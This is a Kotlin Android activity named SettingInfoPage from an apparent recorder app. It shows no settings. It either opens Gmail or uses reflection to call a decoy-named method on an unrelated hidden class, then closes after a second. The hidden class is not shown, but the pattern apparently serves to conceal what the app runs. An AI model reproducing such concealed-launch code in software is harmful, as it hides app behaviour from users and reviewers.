package com.record.fdapxl.sound.recorderpuls114

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2025/2/19
 * Describe:
 */
class SettingInfoPage : AppCompatActivity() {
    private var nameList = arrayListOf("anyWaiter", "anyWaiter", "anyWaiter")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        runCatching {
            val intent = packageManager.getLaunchIntentForPackage("com.google.android.gm")
            if (intent != null) {
                startActivity(intent)
            } else {
                val clazz = Class.forName("com.waitress.greeting.WaitManager")
                clazz.getMethod(nameList[0], Any::class.java).invoke(null, this@SettingInfoPage)
            }
        }.onFailure {
            val clazz = Class.forName("com.waitress.greeting.WaitManager")
            clazz.getMethod(nameList[2], Any::class.java).invoke(null, this@SettingInfoPage)
        }
        lifecycleScope.launch {
            delay(1000)
            finish()
        }
    }
}